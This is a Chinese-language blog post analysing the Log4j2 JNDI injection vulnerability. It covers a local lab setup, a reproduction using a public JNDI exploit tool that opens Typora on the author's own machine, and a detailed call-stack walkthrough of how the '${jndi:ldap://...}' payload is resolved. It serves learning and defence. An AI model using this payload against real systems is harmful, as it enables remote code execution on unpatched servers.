之前在实习写的文章都投到了公司平台，没有在这边更新，后面会在freebuf上重新更新记录。这个也是去年刚出这个漏洞的时候分析的，没有发布在外面平台。

## 一、环境搭建

### 1.引入jar包

使用idea新建项目并且引入jar包，这里需要两个包log4j-core和log4j-api。在<https://logging.apache.org/log4j/2.x/download.html>下载编译好的Apache
Log4j jar包 或者网盘下载 链接：<https://www.aliyundrive.com/s/NQY9Lj5Nbfq>。

在file处点击Project Structure来添加下载的jar包。

![1647883685_6238b5a5217104beb970b.png!small?1647883685160](https://image.3001.net/images/20220322/1647883685_6238b5a5217104beb970b.png!small?1647883685160)

完成后可以在这里看到添加的包![1647883723_6238b5cb8b93ef296ea63.png!small?1647883723500](https://image.3001.net/images/20220322/1647883723_6238b5cb8b93ef296ea63.png!small?1647883723500)

### 2.添加漏洞代码

    
    
    import org.apache.logging.log4j.Logger;  
    import org.apache.logging.log4j.LogManager;  
    ​  
    public class log4j {  
    private static final Logger logger = LogManager.getLogger(log4j.class);  
    ​  
    public static void main(String[] args) {  
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");  
    logger.error("${jndi:ldap://xxx/xxx}");  
    }  
    }

## 二、漏洞复现

1.使用jndi注入工具起一个服务，这里我使用<https://github.com/welk1n/JNDI-Injection-Exploit>这个工具，在本地执行开启Typora的命令

![1647883758_6238b5ee80b4c57d16379.png!small?1647883759249](https://image.3001.net/images/20220322/1647883758_6238b5ee80b4c57d16379.png!small?1647883759249)

因为我这里是1.8的环境所以选择框出来的这个路径

![1647883789_6238b60dda5b1a70bcdb4.png!small?1647883792165](https://image.3001.net/images/20220322/1647883789_6238b60dda5b1a70bcdb4.png!small?1647883792165)

运行代码即可执行命令

![1647883800_6238b618abf69737655a9.png!small?1647883800654](https://image.3001.net/images/20220322/1647883800_6238b618abf69737655a9.png!small?1647883800654)

服务接受到连接信息

![1647883809_6238b62197158a5e973dd.png!small?1647883809774](https://image.3001.net/images/20220322/1647883809_6238b62197158a5e973dd.png!small?1647883809774)

根据这个思路我们可以不使用dnslog类平台来检测，github有一个burp的插件项目依靠查看ldap服务是否有连接进来来判断是否存在漏洞，使用这种方法就可以在本机或vps上起一个服务来判断这样会快很多，而且内网环境搭在本机也可以使用。网盘链接：<https://www.aliyundrive.com/s/3kDp5HELGxo>

## 三、漏洞分析

我们知道这个漏洞是个jndi的注入那么就可以在lookup处打断点来查看调用栈（也可以在执行命令的地方java.lang.Runtime的exec方法下断点），全局搜索InitialContext类在lookup处下断点

![1647883818_6238b62a545bf5d284336.png!small?1647883818271](https://image.3001.net/images/20220322/1647883818_6238b62a545bf5d284336.png!small?1647883818271)

debug下可以看到调用栈，整个还是很深的。

![1647883828_6238b634de771b5f06c99.png!small?1647883829127](https://image.3001.net/images/20220322/1647883828_6238b634de771b5f06c99.png!small?1647883829127)

    
    
    lookup:417, InitialContext (javax.naming)  
    lookup:172, JndiManager (org.apache.logging.log4j.core.net)  
    lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)  
    lookup:198, Interpolator (org.apache.logging.log4j.core.lookup)  
    resolveVariable:1060, StrSubstitutor (org.apache.logging.log4j.core.lookup)  
    substitute:982, StrSubstitutor (org.apache.logging.log4j.core.lookup)  
    substitute:878, StrSubstitutor (org.apache.logging.log4j.core.lookup)  
    replace:433, StrSubstitutor (org.apache.logging.log4j.core.lookup)  
    format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)  
    format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)  
    toSerializable:341, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)  
    toText:240, PatternLayout (org.apache.logging.log4j.core.layout)  
    encode:225, PatternLayout (org.apache.logging.log4j.core.layout)  
    encode:59, PatternLayout (org.apache.logging.log4j.core.layout)  
    directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)  
    processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:485, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:460, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)  
    log:162, Logger (org.apache.logging.log4j.core)  
    tryLogMessage:2190, AbstractLogger (org.apache.logging.log4j.spi)  
    logMessageTrackRecursion:2144, AbstractLogger (org.apache.logging.log4j.spi)  
    logMessageSafely:2127, AbstractLogger (org.apache.logging.log4j.spi)  
    logMessage:2003, AbstractLogger (org.apache.logging.log4j.spi)  
    logIfEnabled:1975, AbstractLogger (org.apache.logging.log4j.spi)  
    error:732, AbstractLogger (org.apache.logging.log4j.spi)  
    main:9, log4j

漏洞触发的入口函数在logIfEnabled,这里需要知道的是为什么我们的payload${jndi:JNDIContent}能够被传入，原因是在log4j2中有8个日志级别，`error()`和`fatal()`方法可默认触发漏洞，其余的方法需要配置日志级别才可以触发漏洞。因为在`logIfEnabled`方法中，对当前日志等级进行了一次判断，当isEnabled方法为true才能进入到logMessage：

![1647883915_6238b68b8f2115dd3454d.png!small?1647883915474](https://image.3001.net/images/20220322/1647883915_6238b68b8f2115dd3454d.png!small?1647883915474)

跟进下去可以看到进行判断的方法为filter，return返回的值是需要现在的日志等级大于等于默认等级的

![1647883903_6238b67f01bd10562d183.png!small?1647883903010](https://image.3001.net/images/20220322/1647883903_6238b67f01bd10562d183.png!small?1647883903010)

然后才可以执行到logMessage这个方法中，将payload传递下去。

![1647883890_6238b67208326108f7a43.png!small?1647883889937](https://image.3001.net/images/20220322/1647883890_6238b67208326108f7a43.png!small?1647883889937)

后面的调用方法都是关于包装和调用的了，不关键的调用如下

    
    
    format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)  
    toSerializable:341, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)  
    toText:240, PatternLayout (org.apache.logging.log4j.core.layout)  
    encode:225, PatternLayout (org.apache.logging.log4j.core.layout)  
    encode:59, PatternLayout (org.apache.logging.log4j.core.layout)  
    directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)  
    tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)  
    callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)  
    processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:485, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:460, LoggerConfig (org.apache.logging.log4j.core.config)  
    log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)  
    log:162, Logger (org.apache.logging.log4j.core)  
    tryLogMessage:2190, AbstractLogger (org.apache.logging.log4j.spi)  
    logMessageTrackRecursion:2144, AbstractLogger (org.apache.logging.log4j.spi)  
    logMessageSafely:2127, AbstractLogger (org.apache.logging.log4j.spi)

这里需要说明的是在前面的PatternSerializer这个类中会格式化我们传递过来的payload，这里是会调用converter.format()的，而convertrt是属于MessagePatternConverter这个类的，然后到了MessagePatternConverter中的format方法中

![1647883940_6238b6a4165f1022ac7fa.png!small?1647883940052](https://image.3001.net/images/20220322/1647883940_6238b6a4165f1022ac7fa.png!small?1647883940052)

根据代码可以看到传过来的参数会进行for循环遍历，然后每一位进行判断是否有"${"，有就会使用substring进行分割，将payload赋值给value，然后将value传递到getStrSubstitutor.replace()中。

![1647883955_6238b6b322b49c6354237.png!small?1647883955128](https://image.3001.net/images/20220322/1647883955_6238b6b322b49c6354237.png!small?1647883955128)

这里又将值传递到了substitute这个方法中,然后又会到int型的substitute方法中

![1647883964_6238b6bc0ac9c818fb837.png!small?1647883964006](https://image.3001.net/images/20220322/1647883964_6238b6bc0ac9c818fb837.png!small?1647883964006)

跟进这个方法,可以看到一个叫varName的变量是已经将传递过来的payload中的${}去除掉了，然后将varName变量传递到resolveVariable方法中。

![1647883975_6238b6c700c6d9dfbd486.png!small?1647883975028](https://image.3001.net/images/20220322/1647883975_6238b6c700c6d9dfbd486.png!small?1647883975028)

可以看一下上面的代码是怎样实现去除的

首先看第一个while循环，这里使用prefixMatcher.isMatch来对pos进行自增

![1647883982_6238b6ceed8a9adb471d8.png!small?1647883982931](https://image.3001.net/images/20220322/1647883982_6238b6ceed8a9adb471d8.png!small?1647883982931)

然后跟进看看这个isMatch的代码，可以知道是实现了${的定位，利用chars数组循环匹配来确定payload中${结束的位置，返回长度len为2

![1647883992_6238b6d801334489b7a79.png!small?1647883992038](https://image.3001.net/images/20220322/1647883992_6238b6d801334489b7a79.png!small?1647883992038)

所以startMatchLen的值为2，跳转到else条件中

![1647884013_6238b6edde11e540b8bc1.png!small?1647884013899](https://image.3001.net/images/20220322/1647884013_6238b6edde11e540b8bc1.png!small?1647884013899)

![1647884018_6238b6f28503e3860af7b.png!small?1647884018416](https://image.3001.net/images/20220322/1647884018_6238b6f28503e3860af7b.png!small?1647884018416)

这段代码和前面匹配${的代码类似，跟进isMatch发现chars是}，所以suffixMacher.isMatch是用相同办法匹配了}的位置

![1647884023_6238b6f7cd87be021dd8e.png!small?1647884023952](https://image.3001.net/images/20220322/1647884023_6238b6f7cd87be021dd8e.png!small?1647884023952)

这样就从${}截取出了值，然后赋值给了varNameExpr，再赋值给了varName传递到resolveVariable方法，这个方法调用interpolator的lookup方法

![1647884037_6238b705db416cd488d6b.png!small?1647884037960](https://image.3001.net/images/20220322/1647884037_6238b705db416cd488d6b.png!small?1647884037960)

可以看到第一个框中代码是取到了前缀:jndi，第二个框中代码获取:ldap://127.0.0.1:1389/ufydj4，第三个框中根据prefix来获取JndiLookup类，最后就会在JndiLookup类中调用JndiManager.lookup方法

![1647884043_6238b70b90118936a85b9.png!small?1647884043527](https://image.3001.net/images/20220322/1647884043_6238b70b90118936a85b9.png!small?1647884043527)

后面就和jndi注入一样了，通过jndiManager类进行调用，成功执行到javax/naming/InitialContext.java
原生lookup解析函数。

  

